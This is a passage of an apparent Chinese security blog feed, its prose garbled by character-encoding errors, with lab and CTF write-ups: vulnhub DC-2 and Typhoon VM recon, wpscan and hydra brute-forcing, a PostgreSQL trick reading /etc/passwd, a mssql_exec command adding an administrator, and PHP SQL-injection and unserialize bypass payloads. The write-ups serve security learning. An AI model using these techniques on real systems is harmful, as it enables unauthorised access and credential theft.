·çš„æ‰«æé¶æœºipï¼Œç„¶åŽæ‰«æç«¯å£ï¼Œä¹‹åŽæ‰«æç«¯å£å¯¹åº”çš„æœåŠ¡ å‘çŽ°å¼€æ”¾äº†80å’Œ7744ç«¯å£ 1234567891011121314# root @ kali in ~/dirsearch on git:master o [20:46:10] $ nmap -sV -p80,7744 192.168.19.132Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:47 EDTNmap scan report for 192.168.19.132Host is up (0.00046s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)MAC Address: 00:0C:29:6A:1A:54 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds ç„¶åŽä¿®æ”¹hostsæ–‡ä»¶ï¼Œæ‰“å¼€ç½‘å€å‘çŽ°åˆæ˜¯ä¸€ä¸ªwordpress flagé¡µé¢æç¤ºç”¨cewlå‘½ä»¤ç”Ÿæˆä¸€ä¸ªå­—å…¸ cewl -w dc2_passwords.txt http://dc-2 ç”¨wpscanæ‰«æå‡ºç”¨æˆ·åï¼Œç„¶åŽå†ç”¨wpscançˆ†ç ´å¯†ç  wpscan --url http://dc-2/ -e -t 20 wpscan --url http://dc-2/ -U user.txt -P dc2_passwords.txt 123[i] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>nmap</tag>
        <tag>ææƒ</tag>
        <tag>masscan</tag>
        <tag>find</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[typhooné¶æœºæ¸—é€]]></title>
    <url>%2F2019%2F08%2F09%2Ftyphoon%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[æ˜¨å¤©æ™šä¸Šå®žæˆ˜äº†ä¸€æŠŠï¼Œé‡åˆ°äº†å¾ˆå¤šå¸ˆå‚…ï¼Œä¹Ÿç§¯ç´¯äº†ä¸€äº›åˆ·é¶æœºçš„ç»éªŒï¼Œè™½ç„¶Windowsé‚£å°é¶æœºä¸çŸ¥é“æ˜¯æ€Žä¹ˆå›žäº‹ï¼Œä½†æ˜¯Linuxé‚£å°è¿˜æ˜¯çŽ©çš„æ¯”è¾ƒçˆ½çš„ã€‚ ä»Šå¤©åˆé‡æ–°ä»Ž https://vulnhub.com ä¸ŠæŠŠé¶æœºæžä¸‹æ¥è£…åˆ°Vmwareä¸Šè‡ªå·±å®žéªŒ é¶æœºæ¸—é€ä¹‹å‰ä¹ŸçŽ©è¿‡ï¼Œä½†æ˜¯æˆ‘æ¯æ¬¡å‘çŽ°è‡ªå·±éƒ½æ— æ³•æ‰¾åˆ°é¶æœºçš„ipåœ°å€ï¼Œè¿™æ¬¡é‡æ–°å®žéªŒäº†ä¸€ä¸‹å¯ä»¥ä½¿ç”¨arp-scanå’Œmasscanå·¥å…· 1234567891011# root @ kali in ~ [3:04:28] C:1$ arp-scan 192.168.41.0/24Interface: eth0, datalink type: EN10MB (Ethernet)Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)192.168.41.1 00:50:56:c0:00:08 VMware, Inc.192.168.41.2 00:50:56:e0:f7:aa VMware, Inc.192.168.41.166 00:0c:29:d7:ef:a4 VMware, Inc.192.168.41.254 00:50:56:f5:fb:f6 VMware, Inc.62 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 responded å‰ä¸¤ä¸ªæ˜¯ç±»ä¼¼ç½‘å…³çš„ï¼Œç¬¬å››ä¸ªæ˜¯kaliçš„ipï¼Œä¸­é—´ç¬¬ä¸‰ä¸ªå°±æ˜¯é¶æœºçš„ipåœ°å€ ç”¨masscanä¹Ÿå¯ä»¥å‘çŽ°,åŒæ—¶ç«¯å£ä¹Ÿå¯ä»¥æ‰«å‡ºæ¥ 12345678910111213141516171819202122232425262728293031# root @ kali in ~ [3:04:28] C:1$ masscan -p0-65535 192.168.41.0/24 --rate=1000000Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-ethInitiating SYN Stealth ScanScanning 256 hosts [65536 ports/host]Discovered open port 631/tcp on 192.168.41.166 Discovered open port 139/tcp on 192.168.41.166 Discovered open port 80/tcp on 192.168.41.166 Discovered open port 22/tcp on 192.168.41.166 Discovered open port 5432/tcp on 192.168.41.166 Discovered open port 995/tcp on 192.168.41.166 Discovered open port 110/tcp on 192.168.41.166 Discovered open port 445/tcp on 192.168.41.166 Discovered open port 3306/tcp on 192.168.41.166 Discovered open port 27017/tcp on 192.168.41.166 Discovered open port 44337/tcp on 192.168.41.166 Discovered open port 6379/tcp on 192.168.41.166 Discovered open port 53/tcp on 192.168.41.2 Discovered open port 25/tcp on 192.168.41.166 Discovered open port 40811/tcp on 192.168.41.166 Discovered open port 33070/tcp on 192.168.41.166 Discovered open port 993/tcp on 192.168.41.166 Discovered open port 43074/tcp on 192.168.41.166 Discovered open port 21/tcp on 192.168.41.166 Discovered open port 53/tcp on 192.168.41.166 Discovered open port 2049/tcp on 192.168.41.166 Discovered open port 37535/tcp on 192.168.41.166 Discovered open port 8080/tcp on 192.168.41.166 Discovered open port 143/tcp on 192.168.41.166 nmapæ‰«ææœ€å¸¸ç”¨å‘½ä»¤nmap -sV -A -p- ipå¯ä»¥æ‰«æåˆ°é¶æœºå¼€æ”¾çš„ç«¯å£å’ŒæœåŠ¡ï¼Œå½“ç„¶é‚£å°é¶æœºå¼€æ”¾äº†å¥½å¤šå¥½å¤šä¸ªç«¯å£ï¼Œéœ€è¦è®°ä½ä¸€äº›å¸¸ç”¨çš„ç«¯å£å’Œå®ƒä»¬å¯¹åº”çš„æœåŠ¡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384Nmap scan report for 192.168.110.164Host is up (0.00034s latency).Not shown: 985 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.2|_ftp-anon: Anonymous FTP login allowed (FTP code 230)|_ftp-bounce: bounce working!| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.110.72| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.2 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)| 2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)| 256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)|_ 256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)25/tcp open smtp?|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 53/tcp open domain ISC BIND 9.9.5-3 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.9.5-3-Ubuntu80/tcp open http Apache httpd 2.4.7 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 1 disallowed entry |_/mongoadmin/|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Typhoon Vulnerable VM by PRISMA CSI110/tcp open pop3 Dovecot pop3d|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES|_ssl-date: TLS randomness does not represent time111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100003 2,3,4 2049/tcp nfs| 100003 2,3,4 2049/udp nfs| 100005 1,2,3 43523/tcp mountd| 100005 1,2,3 58512/udp mountd| 100021 1,3,4 39728/udp nlockmgr| 100021 1,3,4 59010/tcp nlockmgr| 100024 1 39860/udp status| 100024 1 57414/tcp status| 100227 2,3 2049/tcp nfs_acl|_ 100227 2,3 2049/udp nfs_acl139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)143/tcp open imap Dovecot imapd (Ubuntu)|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS|_ssl-date: TLS randomness does not represent time445/tcp open netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)993/tcp open ssl/imaps?|_ssl-date: TLS randomness does not represent time995/tcp open ssl/pop3s?|_ssl-date: TLS randomness does not represent time2049/tcp open nfs_acl 2-3 (RPC #100227)3306/tcp open mysql?|_mysql-info: ERROR: Script execution failed (use -d to debug)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1| http-methods: | Supported Methods: GET HEAD POST PUT DELETE OPTIONS|_ Potentially risky methods: PUT DELETE|_http-open-proxy: Proxy might be redirecting requests|_http-server-header: Apache-Coyote/1.1|_http-title: Apache TomcatWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: WAPRunning: Actiontec embedded, LinuxOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernelOS details: Actiontec MI424WR-GEN3I WAPNetwork Distance: 2 hopsTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: IncrementalService Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel åŒæ—¶è¿˜æœ‰ä¸€ä¸ªæ‰«æç»“æžœï¼šä»¥å‰ä¼¼ä¹Žæ²¡æœ‰çœ‹åˆ°è¿‡ 12345678910111213141516171819202122232425262728293031323334Host script results:|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s| nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:| TYPHOON&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;| TYPHOON&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;| TYPHOON&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;| \x01\x02__MSBROWSE__\x02&lt;01&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;| WORKGROUP&lt;1d&gt; Flags: &lt;unique&gt;&lt;active&gt;|_ WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;| smb-os-discovery: | OS: Unix (Samba 4.1.6-Ubuntu)| Computer name: typhoon| NetBIOS computer name: TYPHOON\x00| Domain name: local| FQDN: typhoon.local|_ System time: 2019-08-09T11:30:49+03:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2019-08-09 04:30:48|_ start_date: N/ATRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 0.04 ms 192.168.41.22 0.17 ms 192.168.110.164 æˆ‘æœ€å…ˆæ‰“çš„æ˜¯2049ç«¯å£ï¼Œå› ä¸ºè¿™ä¸ªç«¯å£å¯¹åº”çš„æ˜¯nfsæœåŠ¡ï¼Œç”¨è¿™æ¡å‘½ä»¤ï¼š nmap -sV --script=nfs-showmount ipæ‰«å‡ºå¯ä»¥è¿œç¨‹æŒ‚è½½çš„ç›®å½• ä¹‹åŽå°è¯•æŒ‚è½½ï¼Œä½†æ˜¯æˆ‘æ— æ³•ç”¨getå‘½ä»¤å°†æ–‡ä»¶æ‹·è´ä¸‹æ¥emmmmï¼Œä¸»æœºä¹Ÿæ²¡æœ‰å¯¹åº”çš„æŒ‚è½½ç›®å½•ã€‚ é˜Ÿå‹æ‰“äº†21å·ç«¯å£ï¼Œä½†æ˜¯ä¿¡æ¯ä¹Ÿä¸æ˜¯å¾ˆå¤š 22å·ç«¯å£æ˜¯sshæœåŠ¡ï¼ŒAç»„çš„å¸ˆå‚…çˆ†å‡ºäº†å¯†ç ï¼Œå‚è€ƒå®‰å…¨å®¢ä¸Šçš„æ–¹æ³•ï¼Œå¯ä»¥å…ˆæžšä¸¾ç”¨æˆ·åï¼Œ å‘çŽ°é¶æœºåå­—ä¸ºtyphoonå°±æƒ³ç€åŽ»æµ‹è¯•ä¸€ä¸‹çœ‹çœ‹è´¦å·å­˜ä¸å­˜åœ¨,åˆ©ç”¨sshç”¨æˆ·æžšä¸¾æ¼æ´žè¿›è¡Œæµ‹è¯• åœ¨GitHubä¸Šæ‰¾äº†ä¸€ä¸ªssh_enumçš„è„šæœ¬ï¼Œå°è¯•ä¸€ä¸‹è¿˜è¡Œä½†æ˜¯æ²¡æœ‰å¥½å­—å…¸ hydraå¯ä»¥çˆ†ç ´å¼±å£ä»¤ï¼š hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.56.150 ç¬¬ä¸€æ¬¡æ¸—é€æ„Ÿè§‰è¿˜ä¸æ˜¯å¾ˆç†Ÿç»ƒï¼Œèƒ½å¤Ÿåšåˆ°çš„å°±æ˜¯è¿™äº›ðŸ˜¢ 21å·ç«¯å£ search ftp_versionæ”¶é›†ftpæœåŠ¡å™¨çš„ä¿¡æ¯ 12345msf5 auxiliary(scanner/ftp/ftp_version) &gt; exploit [+] 192.168.41.166:21 - FTP Banner: &apos;220 (vsFTPd 3.0.2)\x0d\x0a&apos;[*] 192.168.41.166:21 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed å¦‚æžœè¿™ä¸ªç‰ˆæœ¬çš„ftpæœ‰æ¼æ´žçš„è¯æ˜¯ä¸æ˜¯å¯ä»¥getshellï¼Ÿ æµè§ˆå™¨ç›´æŽ¥è®¿é—®å¹¶æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ å°è¯•ä½¿ç”¨exploit/unix/ftp/vsftpd_234_backdoorè¿›è¡Œæ¸—é€ä½†æ˜¯æ²¡æˆåŠŸ 22ç«¯å£ å°è¯•æžšä¸¾ç”¨æˆ·åä¸ºtyphoon æˆåŠŸæžšä¸¾ ä½¿ç”¨hydraåŽ»çˆ†ç ´å¯†ç hydra -l typhoon -P /usr/share/wordlist/metasploit/unix_passwords.txt ssh://192.168.41.166 25ç«¯å£smtpæœåŠ¡ èŽ·å–åˆ°æœåŠ¡å™¨çš„ä¿¡æ¯ 12345msf5 auxiliary(scanner/smtp/smtp_version) &gt; exploit [+] 192.168.41.166:25 - 192.168.41.166:25 SMTP 220 typhoon ESMTP Postfix (Ubuntu)\x0d\x0a[*] 192.168.41.166:25 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 5432ç«¯å£postgresqlæœåŠ¡ è¡¥å……ä¸€ç‚¹postgresqlæ“ä½œï¼š åˆ—å‡ºæ•°æ®åº“\lï¼š 12345678910postgres=# \l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres(3 rows) åˆ—å‡ºtable'\d': 123456ostgres=# \d List of relations Schema | Name | Type | Owner --------+-------+-------+---------- public | mrlee | table | postgres(1 row) ä¹‹åŽä½¿ç”¨metasploitçš„æ¨¡å—åŽ»æ”¶é›†ä¿¡æ¯ 12345msf5 auxiliary(scanner/postgres/postgres_version) &gt; exploit [*] 192.168.41.166:5432 Postgres - Version PostgreSQL 9.3.4 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.2-16ubuntu6) 4.8.2, 64-bit (Post-Auth)[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed ç›´æŽ¥å‘çŽ°å¼±å£ä»¤ 1234[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)[-] 192.168.41.166:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)[+] 192.168.41.166:5432 - Login Successful: postgres:postgres@template1[-] 192.168.41.166:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password) ç„¶åŽç™»é™† 1234567# root @ kali in ~ [3:34:50] C:127$ psql -h 192.168.41.166 -U postgresPassword for user postgres: psql (11.2 (Debian 11.2-2), server 9.3.4)Type &quot;help&quot; for help.postgres=# help select pg_ls_dir('./');åˆ—å‡ºç›®å½• 1234567891011121314151617181920postgres=# select pg_ls_dir(&apos;./&apos;); pg_ls_dir ----------------- PG_VERSION pg_notify pg_multixact pg_subtrans pg_serial pg_snapshots pg_stat pg_clog pg_xlog base pg_twophase pg_tblspc global pg_stat_tmp postmaster.opts postmaster.pid(16 rows) å»ºè¡¨å¹¶ä¸”ä»Ž/etc/passwdä¸­æ‹·è´æ•°æ®è¿‡æ¥å†è¯»å–,ï¼ˆè¿™ä¸ªå§¿åŠ¿ç¬¬ä¸€æ¬¡è§ï¼‰ 1234567891011121314151617181920postgres=# DROP TABLE if EXISTS MrLee;NOTICE: table &quot;mrlee&quot; does not exist, skippingDROP TABLEpostgres=# CREATE TABLE MrLee(t TEXT);CREATE TABLEpostgres=# COPY MrLee FROM &apos;/etc/passwd&apos;;COPY 44postgres=# SELECT * FROM MrLee limit 1 offset 0; t --------------------------------- root:x:0:0:root:/root:/bin/bash(1 row)postgres=# SELECT * FROM MrLee; t ----------------------------------------------------------------------------------- root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin DC1é¶æœº å§¿åŠ¿ï¼š findå‘½ä»¤ææƒï¼Œhydraçˆ†ç ´ï¼ŒDrupalé‡ç½®ç®¡ç†å‘˜å¯†ç  éœ€è¦ç§¯ç´¯ä¸€äº›é¶æœºæ¸—é€çš„ç»éªŒ msfæœ‰å¥½å¤šçš„æ‰«æå·¥å…·åœ¨auxiliaryæ¨¡å—é‡Œé¢ï¼Œå¸¸ç”¨çš„ftpï¼Œsshï¼Œsmbï¼Œhttps msfå„ç§å¼±å£ä»¤çˆ†ç ´ åŒæ—¶éœ€è¦ç†Ÿæ‚‰findå’Œgrepå‘½ä»¤ Linux findå’Œgrepå‘½ä»¤ ç†Ÿæ‚‰ä¸€ä¸‹å„ç§cmsçš„å¸¸è§å§¿åŠ¿ å¿˜è®°Drupalçš„ç®¡ç†å‘˜å¯†ç çš„è§£å†³åŠžæ³• metasploitæ¸—é€mssqlæœåŠ¡ 1433ç«¯å£å¯¹åº”äºŽmssqlæœåŠ¡ï¼Œç¬¬ä¸€æ­¥ä¸€èˆ¬æ˜¯å¼±å£ä»¤ï¼š use auxiliary/scanner/mssql/mssql_login ç„¶åŽè®¾ç½®å­—å…¸è·¯å¾„å’Œè¿œç¨‹ä¸»æœºå³å¯ è¿˜å¯ä»¥ä½¿ç”¨auxiliary/scanner/mssql/mssql_pingè¿›ä¸€æ­¥æ”¶é›†ä¿¡æ¯ ä¹‹åŽå°è¯•ç™»é™†mssqlæœåŠ¡ use auxiliary/admin/mssql/mssql_exec å¯ä»¥è®¾ç½®cmdset CMD cmd.exe /c net user æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·ï¼Œè¿œç¨‹ç™»é™†ï¼š cmd.exe /c net user shenlan test /add&amp;net localgroup administrator shenlan /add å¼€å¯3389ç«¯å£ä¸€èˆ¬æ˜¯æä¾›è¿œç¨‹æ¡Œé¢æœåŠ¡ï¼Œ æ¸—é€ä¹‹â€”â€”Metasploitæ¸—é€MSSQL masscanæ‰«æå·¥å…· æ‰«ææŒ‡å®šç½‘ç»œå’Œç«¯å£ï¼š masscan.exe -p80 192.168.81.1/24 æ‰«ææŒ‡å®šä¸»æœºæ‰€æœ‰å¼€æ”¾çš„ç«¯å£ï¼š masscan.exe -p0-65535 192.168.81.143 --bannerså¯ä»¥èŽ·å–æœåŠ¡å™¨çš„bannerä¿¡æ¯ --echoé€‰é¡¹å°†é…ç½®ä¿¡æ¯ä¿å­˜ä¸‹æ¥ï¼Œè¿™æ ·å¯ä»¥ä¸‹ä¸€æ¬¡å¿«é€Ÿæ‰«æ masscan.exe -p80,443,3306 192.168.81.143 --banners --echo&gt;1.conf ä¿å­˜é…ç½®ä¿¡æ¯ masscan.exe -c 1.conf è¯»å–é…ç½®ä¿¡æ¯ --rateæé«˜æ‰«æé€Ÿåº¦ æ¸—é€æŠ€å·§ï¼šWindowså¹³å°è¿è¡ŒMasscanå’ŒNmap nmapé«˜çº§ä½¿ç”¨æŠ€å·§ nmapå¸¸è§çš„æ‰«ææ–¹å¼ï¼š åŠå¼€æ”¾æ‰«æ: -sS æ²¡æœ‰å»ºç«‹ä¸‰æ¬¡æ¡æ‰‹è¿žæŽ¥ï¼Œé€Ÿåº¦å¾ˆå¿« å…¨è¿žæŽ¥æ‰«æï¼š-sT ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œé€Ÿåº¦è¾ƒæ…¢ æ‰«æUDPç«¯å£ï¼š -sU]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
        <tag>nfs</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®žéªŒå§web]]></title>
    <url>%2F2019%2F08%2F06%2F%E5%AE%9E%E9%AA%8C%E5%90%A7web%2F</url>
    <content type="text"><![CDATA[è®°å½•ä¸€ä¸‹å®žéªŒå§çš„wp åŽå°ç™»é™† ctrl+uæŸ¥çœ‹æºç  123456789&lt;!-- $password=$_POST['password']; $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo 'flag is :'.$flag; &#125; else&#123; echo 'å¯†ç é”™è¯¯!'; &#125; --&gt; ä¸€ä¸Šæ¥å°±é—®ç®¡ç†å‘˜å¯†ç ï¼Œå¹¶ä¸”è¦æ±‚ç™»é™†ï¼Œé‚£ä¹ˆæ˜¯çˆ†ç ´å‘¢ï¼Œè¿˜æ˜¯çˆ†ç ´å‘¢ï¼Ÿ emmmmmå…¶å®žè¿™é¢˜çš„è€ƒç‚¹æ˜¯md5çš„ æŸ¥äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œmd5å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å¦‚æžœä¸ºtrue,é‚£ä¹ˆå°±ä¼šè¿”å›žåŽŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ è€Œä¸”sqlè¯­å¥æ˜¾ç„¶æ˜¯å¯ä»¥æ‹¼æŽ¥æ³¨å…¥çš„ï¼Œå…³é”®åœ¨äºŽå¦‚ä½•æ³¨å…¥äº† æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š ffifdyop md5åŽï¼Œ276f722736c95d99e921722cf9ed621cå†è½¬æˆå­—ç¬¦ä¸²:' ' 'or' 6&lt;trach&gt;è§£æž:å­˜åœ¨ or å³ä»£ç çš„ä¸¤è¾¹æœ‰ä¸€è¾¹ä¸ºçœŸæ—¢å¯ä»¥ç»•è¿‡ï¼Œ&lt;trach&gt;å…¶å®žä¸ºåžƒåœ¾ä»£ç æ²¡æœ‰ä»»ä½•ç”¨çš„ã€‚or åŽé¢æœ‰6ï¼Œéžé›¶å€¼å³ä¸ºçœŸã€‚æ—¢å¯ä»¥æˆåŠŸç»•è¿‡ã€‚ http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php å½“ç„¶çœ‹è¯„è®ºä¹Ÿæœ‰è¯´å¯†ç å°±æ˜¯e58çš„ å‚è€ƒ è®¤çœŸä¸€ç‚¹ è¿™é“é¢˜æ˜¯ç›²æ³¨çš„é¢˜ç›®ï¼Œä¸å¤ªå¥½æž å¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´ è¿™ä¸ªå¯ä»¥é€šè¿‡æµè§ˆå™¨æŠ“åŒ…ï¼Œç„¶åŽå‘çŽ°å“åº”å¤´ä¸­æœ‰ä¸€ä¸ªFLAGå­—æ®µæ˜¾ç„¶æ˜¯base64åŠ å¯†è¿‡çš„ï¼Œè§£å¯†ä¹‹åŽå°±ä¼šå¾—åˆ°æç¤ºï¼Œè®©ä½ å†™è„šæœ¬postæäº¤ æˆ‘å†™çš„åžƒåœ¾ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617import urllibimport base64import requestsres = urllib.urlopen("http://ctf5.shiyanbar.com/web/10/10.php")head = str(res.headers)FLAG = head[head.index('FLAG')+6:head.index('FLAG')+48+6]flagBase64 = base64.decodestring(FLAG)TrueFlag = flagBase64[flagBase64.index(':')+1:]data = &#123;'key': TrueFlag&#125;res = requests.post(url='http://ctf5.shiyanbar.com/web/10/10.php', data=data)print res.content å¸ˆå‚…å†™çš„ä»£ç æ¯”æˆ‘å¥½çœ‹å¤šäº† 12345678910111213# coding:utf8import requestsimport base64url = "http://ctf4.shiyanbar.com/web/10.php" # ç›®æ ‡URLs = requests.Session() # èŽ·å– Sessionresponse = s.get(url) # æ‰“å¼€é“¾æŽ¥head = response.headers # èŽ·å–å“åº”å¤´flag = base64.b64decode(head['flag']).split(':')[1] # èŽ·å–ç›¸åº”å¤´ä¸­çš„Flagprint flag # æ‰“å°FlagpostData = &#123;'key': flag&#125; # æž„é€ Postè¯·æ±‚ä½“result = s.post(url=url, data=postData) # åˆ©ç”¨Postæ–¹å¼å‘é€è¯·æ±‚# (æ³¨æ„è¦åœ¨åŒä¸€ä¸ªSessionä¸­ , æœ‰çš„æ—¶å€™è¿˜éœ€è¦è®¾ç½®Cookies , ä½†æ˜¯æ­¤é¢˜ä¸éœ€è¦)print result.text # æ‰“å°å“åº”å†…å®¹ æ‹å¼¯æŠ¹è§’ è¿™ä¸ªæ¶‰åŠåˆ°æˆ‘çš„çŸ¥è¯†ç›²åŒºï¼Œå«åšä¼ªé™æ€é¡µé¢ ç™¾åº¦ç™¾ç§‘ payload http://ctf5.shiyanbar.com/indirection/index.php/a/index.php Forms ä½œä¸ºç½‘ç»œå®‰å…¨çš„äººæ‰ï¼Œä¸€å®šè¦ä»”ç»†è§‚å¯Ÿæ¯ä¸€å¤„åœ°æ–¹ æ¯”å¦‚è¿™ä¸ªé¢˜ç›®çš„è¡¨å•ï¼š 12345&lt;form action="" method="post"&gt; PIN:&lt;br&gt; &lt;input type="password" name="PIN" value=""&gt; &lt;input type="hidden" name="showsource" value=0&gt; &lt;button type="submit"&gt;Enter&lt;/button&gt; å¾ˆæ˜Žæ˜¾çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªhiddenå­—æ®µï¼Œè€Œä¸”æ˜¯showsource,å¦‚æžœå°†å…¶ä¿®æ”¹ä¸º1å°±èƒ½å¾—åˆ°æºç  æºç å¦‚ä¸‹ï¼š 12345678&lt;?php$a = $_POST["PIN"];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo "Congratulations! The flag is $flag";&#125; else &#123; echo "User with provided PIN not found.";&#125;?&gt; emmmmåŽé¢å°±ä¸è¯´äº† å¤©ç½‘ç®¡ç†ç³»ç»Ÿ æŸ¥çœ‹æºç æœ‰éšè—å­—æ®µ 1&lt;!-- $test=$_GET['username']; $test=md5($test); if($test=='0') --&gt; è”æƒ³åˆ°phpä»£ç å®¡è®¡çš„å°trick md5(QNKCDZO)å¾—åˆ°çš„ç»“æžœæ˜¯0eå¼€å¤´çš„ å¾—åˆ°æç¤ºï¼Œ è®¿é—®http://ctf5.shiyanbar.com/10/web1/user.php?fame=hjkleffifer å¾—åˆ°ï¼š 1$unserialize_str = $_POST[&apos;password&apos;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) &#123; print_r($flag); &#125; ä¼Ÿå¤§çš„ç§‘å­¦å®¶phpæ–¹è¨€é“ï¼šæˆä¹Ÿå¸ƒå°”ï¼Œè´¥ä¹Ÿå¸ƒå°”ã€‚ å›žåŽ»å§éªšå¹´ å¤©çœŸçš„æˆ‘ä»¥ä¸ºé‚£ä¸‰ä¸ªé—®å·å°±æ˜¯çœŸçš„é—®å· å”‰ã€‚ã€‚ 12345678&lt;?php$a = array('user'=&gt;true, 'pass'=&gt;true);$b = serialize($a);$c = unserialize($b);var_dump($b);?&gt; å°†è¿™ä¸ªä½œä¸ºpasswordè¾“å…¥a:2:{s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;} å¿˜è®°å¯†ç  è¿™ä¸ªé¢˜ç›®æœ‰ç‚¹éš¾åº¦ ä¸è¿‡è¿˜æ˜¯è¦èŽ·å–ä¿¡æ¯ æŸ¥çœ‹æºä»£ç å‘çŽ°ä¸¤å¤„å…³é”®ä¿¡æ¯ï¼š 12&lt;meta name="admin" content="admin@simplexue.com" /&gt;&lt;meta name="editor" content="Vim" /&gt; å‘Šè¯‰äº†ä½ 